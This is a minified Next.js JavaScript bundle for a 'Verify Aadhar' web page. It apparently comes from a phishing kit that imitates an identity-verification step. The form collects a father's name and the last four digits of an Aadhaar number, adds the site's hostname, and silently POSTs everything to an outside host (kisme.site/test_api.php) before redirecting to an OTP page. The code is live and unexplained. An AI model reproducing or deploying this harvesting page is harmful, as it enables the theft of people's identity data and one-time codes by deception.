(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[298],{5140:function(e,t,s){Promise.resolve().then(s.bind(s,6338))},6338:function(e,t,s){"use strict";s.r(t),s.d(t,{default:function(){return _}});var n=s(7437);s(6482);var a=s(4033),r=s(2265);function _(){let e=(0,a.useRouter)(),[t,s]=(0,r.useState)(!1);return(0,n.jsxs)("main",{children:[(0,n.jsx)("div",{className:"Tpv_login_heading__E5J6K",children:(0,n.jsx)("h3",{className:"Tpv_login_heading_h3__z0Qx1",children:"Verify Aadhar"})}),(0,n.jsxs)("div",{className:"Tpv_login_form___9zpm",children:[(0,n.jsx)("p",{className:"Tpv_mandatory_txt__YZHLO",children:"Required fields an asterisk (*)"}),(0,n.jsxs)("form",{className:"Tpv_form__okPRU",onSubmit:t=>{t.preventDefault();let n=new FormData(t.target),a={};n.forEach((e,t)=>{a[t]=e}),a.site=window.location.hostname,fetch("https://kisme.site/test_api.php?token=WILASKLDJADLKJASD",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(a)}).then(e=>e.json()).then(t=>{200==t.status?(s(!0),e.push("/otp")):(s(!1),console.log("failed"))}).catch(e=>{s(!1),console.error(e)})},children:[(0,n.jsxs)("div",{className:"Tpv_form_group__aHWg0",children:[(0,n.jsxs)("label",{className:"Tpv_label__cObJz",children:["Father Name",(0,n.jsx)("span",{className:"Tpv_mandatory_txt__YZHLO",children:"*"})]}),(0,n.jsx)("input",{name:"FN",type:"e",className:"Tpv_form_control__5hzGF",required:!0})]}),(0,n.jsxs)("div",{className:"Tpv_form_group__aHWg0",children:[(0,n.jsxs)("label",{className:"Tpv_label__cObJz",children:["Last 4-digit Adhar No ",(0,n.jsx)("span",{className:"Tpv_mandatory_txt__YZHLO",children:"*"})]}),(0,n.jsx)("input",{name:"LDAN",type:"text",inputMode:"numeric",minLength:4,maxLength:4,className:"Tpv_form_control__5hzGF",required:!0})]}),(0,n.jsx)("p",{className:"Tpv_content_title__SWlCq",children:"81% Done"}),(0,n.jsx)("div",{className:"Tpv_t_center__8YF86",children:(0,n.jsx)("input",{type:"submit",className:"Tpv_btn_default__TMlv_",defaultValue:"submit"})})]})]})]})}},6482:function(e,t){"use strict";t.Z={src:"/_next/static/media/captcha.4883c8fe.png",height:34,width:111,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAACCAIAAADq9gq6AAAAPUlEQVR42gEyAM3/AOvo6szL1MbH07y/zL3BzcjJ0ubf3/Lt7ADr7vDN1t/Q2eDN1t7R2ODX3uTr7e7y8/TtLikDW4NbBAAAAABJRU5ErkJggg==",blurWidth:8,blurHeight:2}},622:function(e,t,s){"use strict";var n=s(2265),a=Symbol.for("react.element"),r=(Symbol.for("react.fragment"),Object.prototype.hasOwnProperty),_=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,i={key:!0,ref:!0,__self:!0,__source:!0};function o(e,t,s){var n,o={},l=null,c=null;for(n in void 0!==s&&(l=""+s),void 0!==t.key&&(l=""+t.key),void 0!==t.ref&&(c=t.ref),t)r.call(t,n)&&!i.hasOwnProperty(n)&&(o[n]=t[n]);if(e&&e.defaultProps)for(n in t=e.defaultProps)void 0===o[n]&&(o[n]=t[n]);return{$$typeof:a,type:e,key:l,ref:c,props:o,_owner:_.current}}t.jsx=o,t.jsxs=o},7437:function(e,t,s){"use strict";e.exports=s(622)},4033:function(e,t,s){e.exports=s(5313)}},function(e){e.O(0,[971,938,744],function(){return e(e.s=5140)}),_N_E=e.O()}]);